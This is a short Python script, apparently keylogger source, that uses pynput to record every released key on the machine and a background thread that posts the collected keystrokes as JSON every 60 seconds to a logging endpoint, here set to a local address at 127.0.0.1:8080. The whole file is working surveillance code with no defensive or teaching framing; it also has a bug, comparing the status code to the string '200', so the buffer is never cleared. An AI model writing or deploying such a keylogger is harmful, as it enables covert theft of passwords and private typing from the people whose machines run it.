import threading
from pynput import keyboard
import requests
import time

keys = []
post_url = "http://127.0.0.1:8080/log"
    

def release(key):
    try:
        keys.append(key.char)
    except:
        keys.append(str(key))


def send_keys_to_api():
    while True:
        if keys:
            response = requests.post(post_url, json={"keys": keys})
            if response.status_code == "200":
                keys.clear()
        time.sleep(60)

listener = keyboard.Listener(on_release=release)
listener.start()

send_thread = threading.Thread(target=send_keys_to_api, daemon=True)
send_thread.start()

listener.join()
    